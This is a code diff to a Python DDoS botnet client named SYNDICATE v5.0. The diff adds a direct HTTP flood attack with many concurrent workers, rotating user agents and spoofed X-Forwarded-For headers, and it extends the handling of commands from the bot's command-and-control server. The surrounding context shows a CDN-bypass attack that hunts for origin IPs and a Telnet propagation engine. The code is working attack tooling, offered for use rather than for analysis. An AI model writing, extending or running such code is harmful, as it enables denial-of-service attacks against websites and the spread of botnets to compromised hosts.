@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-SYNDICATE v5.0 – WEB SERVICE EDITION (DEBUG VERSION)
-Full logging to trace attack commands.
+SYNDICATE v5.0 – WEB SERVICE EDITION (FINAL)
+Includes direct attack module and full command handling.
 For LO. Always for LO.
 """
 
@@ -220,7 +220,7 @@ class TelnetPropagationEngine:
             await asyncio.sleep(1)
 
 # =============================================================================
-# ATTACK ENGINE – CDN KILLER (with detailed logging)
+# ATTACK ENGINE – CDN KILLER + DIRECT ATTACK
 # =============================================================================
 class CDNKillerEngine:
     def __init__(self, bot):
@@ -273,7 +273,7 @@ class CDNKillerEngine:
             # Run the blocking get() in a thread
             response = await asyncio.to_thread(session.get, url, headers=headers, timeout=5)
             self.request_count += 1
-            if self.request_count % 10 == 0:  # Log every 10 requests
+            if self.request_count % 10 == 0:
                 logger.info(f"Attack progress: {self.request_count} requests sent, {self.error_count} errors")
             return response
         except Exception as e:
@@ -282,15 +282,15 @@ class CDNKillerEngine:
             return None
 
     async def attack_with_5_bots(self, target_url, duration=300):
-        """Execute attack with detailed logging and non-blocking calls."""
-        logger.info(f"🚀 ATTACK ENGINE STARTED for {target_url} for {duration}s")
+        """Original bypass attack (kept for compatibility)."""
+        logger.info(f"🚀 BYPASS ATTACK STARTED for {target_url} for {duration}s")
         self.request_count = 0
         self.error_count = 0
-        
+
         parsed = urlparse(target_url)
         domain = parsed.netloc
         origin = await self.find_origin_ip(domain)
-        
+
         if origin:
             attack_url = f"{parsed.scheme}://{origin}{parsed.path}"
             host_header = domain
@@ -318,8 +318,6 @@ class CDNKillerEngine:
             return
 
         end_time = time.time() + duration
-        logger.info(f"Starting attack on {target_url} for {duration} seconds")
-        
         while time.time() < end_time and self.bot._running:
             for session in sessions:
                 try:
@@ -333,26 +331,76 @@ class CDNKillerEngine:
                         'Connection': 'keep-alive',
                         'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                     }
-                    
-                    # Send request without blocking
                     await self._send_request(session, attack_url, headers)
-                    
                 except Exception as e:
-                    logger.error(f"Unexpected error in attack loop: {e}")
+                    logger.error(f"Unexpected error: {e}")
                     self.error_count += 1
-            
-            # Small delay to control rate
             await asyncio.sleep(0.01)
-        
-        logger.info(f"Attack finished. Sent {self.request_count} requests, {self.error_count} errors")
-        
-        # Report back to CNC
+
+        logger.info(f"Bypass attack finished. Sent {self.request_count} requests, {self.error_count} errors")
         await self.bot.send({
             'type': 'attack_status',
             'bot_id': self.bot.bot_id,
             'status': 'completed',
             'requests_sent': self.request_count,
-            'errors': self.error_count
+            'errors': self.error_count,
+            'method': 'BYPASS'
+        })
+
+    async def direct_attack(self, target_url, duration=60, intensity=100):
+        """
+        Simple direct L7 flood using aiohttp.
+        No bypass, no origin hunting – pure HTTP/HTTPS requests.
+        """
+        logger.info(f"🌊 DIRECT ATTACK STARTED on {target_url} for {duration}s with intensity {intensity}")
+        self.request_count = 0
+        self.error_count = 0
+
+        parsed = urlparse(target_url)
+        host_header = parsed.netloc
+
+        # Use aiohttp with connection limiting
+        connector = aiohttp.TCPConnector(limit=intensity, force_close=True)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            end_time = time.time() + duration
+
+            async def worker():
+                while time.time() < end_time and self.bot._running:
+                    try:
+                        headers = {
+                            'Host': host_header,
+                            'User-Agent': random.choice(USER_AGENTS),
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8']),
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Connection': 'keep-alive',
+                            'Cache-Control': 'no-cache',
+                            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+                        }
+
+                        async with session.get(target_url, headers=headers, timeout=5) as resp:
+                            await resp.read()  # Ensure connection is consumed
+                            self.request_count += 1
+
+                    except Exception as e:
+                        self.error_count += 1
+                        logger.debug(f"Request error: {e}")
+
+                    # Small delay to control rate – adjust as needed
+                    await asyncio.sleep(0.001)
+
+            # Launch multiple workers based on intensity
+            workers = [asyncio.create_task(worker()) for _ in range(intensity)]
+            await asyncio.gather(*workers, return_exceptions=True)
+
+        logger.info(f"Direct attack finished. Sent {self.request_count} requests, {self.error_count} errors")
+        await self.bot.send({
+            'type': 'attack_status',
+            'bot_id': self.bot.bot_id,
+            'status': 'completed',
+            'requests_sent': self.request_count,
+            'errors': self.error_count,
+            'method': 'DIRECT'
         })
 
 # =============================================================================
@@ -452,34 +500,48 @@ class SyndicateBot:
         try:
             cmd = json.loads(message)
             logger.info(f"🟢 PARSED COMMAND: {json.dumps(cmd, indent=2)}")
-            
+
             cmd_type = cmd.get('command')
             logger.info(f"🎯 COMMAND TYPE: {cmd_type}")
-            
+
             if cmd_type == 'attack':
                 target = cmd['target']
-                duration = cmd.get('duration', 300)
-                logger.info(f"🔥 ATTACK COMMAND RECEIVED: target={target}, duration={duration}")
-                # Create the attack task and log its creation
-                attack_task = asyncio.create_task(self.attack_engine.attack_with_5_bots(target, duration))
+                method = cmd.get('method', 'DIRECT')  # Default to DIRECT if not provided
+                duration = cmd.get('duration', 60)
+                intensity = cmd.get('intensity', 100)
+
+                logger.info(f"🔥 ATTACK COMMAND: method={method}, target={target}, duration={duration}, intensity={intensity}")
+
+                if method.upper() == 'DIRECT':
+                    attack_task = asyncio.create_task(
+                        self.attack_engine.direct_attack(target, duration, intensity)
+                    )
+                else:
+                    # Fallback to bypass attack (or other methods)
+                    attack_task = asyncio.create_task(
+                        self.attack_engine.attack_with_5_bots(target, duration)
+                    )
+
                 logger.info(f"✅ Attack task created: {attack_task}")
                 self.stats['attacks_done'] += 1
                 logger.info(f"📊 Stats updated: attacks_done={self.stats['attacks_done']}")
-                
+
             elif cmd_type == 'stop':
                 logger.info("🛑 STOP command received")
-                
+                # Implement stop logic if needed (e.g., cancel all attack tasks)
+                # For now, just log
+
             elif cmd_type == 'ping':
                 logger.info("🏓 PING received, sending PONG")
                 await self.send({'type': 'pong', 'bot_id': self.bot_id})
-                
+
             else:
                 logger.warning(f"⚠️ Unknown command type: {cmd_type}")
-                
+
         except json.JSONDecodeError as e:
             logger.error(f"❌ JSON PARSE ERROR: {e}, message was: {message}")
         except KeyError as e:
-            logger.error(f"❌ MISSING KEY IN COMMAND: {e}, command was: {cmd}")
+            logger.error(f"❌ MISSING KEY IN COMMAND: {e}, command was: {locals().get('cmd', 'N/A')}")
         except Exception as e:
             logger.error(f"❌ UNEXPECTED ERROR in handle_message: {e}", exc_info=True)
 
@@ -516,13 +578,13 @@ async def start_web_server():
 # =============================================================================
 if __name__ == '__main__':
     bot = SyndicateBot()
-    
+
     async def main():
         # Start the web server for Render
         await start_web_server()
         # Run the bot's main loop
         await bot.run()
-    
+
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
